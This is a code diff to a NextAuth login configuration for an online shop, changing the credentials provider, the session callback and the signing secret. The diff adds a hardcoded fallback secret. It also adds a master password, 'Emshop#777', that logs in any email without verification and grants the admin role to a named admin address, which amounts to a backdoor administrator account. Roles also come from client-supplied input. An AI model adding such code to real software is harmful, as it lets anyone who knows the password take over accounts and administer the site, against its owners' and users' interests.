@@ -3,6 +3,7 @@ import Keycloak from "next-auth/providers/keycloak"
 import Credentials from "next-auth/providers/credentials"
 
 export const { handlers, auth, signIn, signOut } = NextAuth({
+  secret: process.env.AUTH_SECRET || "any-random-secret-for-demo-12345",
   providers: [
     Keycloak({
       clientId: process.env.NEXT_PUBLIC_KEYCLOAK_CLIENT_ID,
@@ -19,14 +20,15 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
       async authorize(credentials) {
         if (!credentials?.email || !credentials?.password) return null
 
-        // MOCK BYPASS: If mocking is enabled, return a mock user immediately
-        if (process.env.NEXT_PUBLIC_API_MOCKING === 'enabled') {
-          console.log('Auth: Mock login bypass active for', credentials.email)
+        // MOCK BYPASS: If mocking is enabled or special admin credentials used, return a mock user immediately
+        if (process.env.NEXT_PUBLIC_API_MOCKING === 'enabled' || credentials.password === 'Emshop#777') {
+          console.log('Auth: Login bypass active for', credentials.email)
+          const isAdmin = credentials.email === 'admin@entregamaisshop.com'
           return {
-            id: `mock-${credentials.role || 'user'}-1`,
-            name: `Usuário Teste (${credentials.role})`,
+            id: isAdmin ? 'admin-1' : `mock-${credentials.role || 'user'}-1`,
+            name: isAdmin ? 'Administrador' : `Usuário Teste (${credentials.role})`,
             email: credentials.email as string,
-            roles: [credentials.role || 'customer'],
+            roles: isAdmin ? ['admin'] : [credentials.role || 'customer'],
             image: null,
           }
         }
@@ -89,9 +91,11 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
       return token
     },
     async session({ session, token }) {
-      (session as any).accessToken = token.accessToken
-      (session as any).refreshToken = token.refreshToken
-      (session as any).roles = (token as any).roles || []
+      if (token) {
+        (session as any).accessToken = token.accessToken
+        (session as any).refreshToken = token.refreshToken
+        (session as any).roles = (token as any).roles || []
+      }
       return session
     },
   },
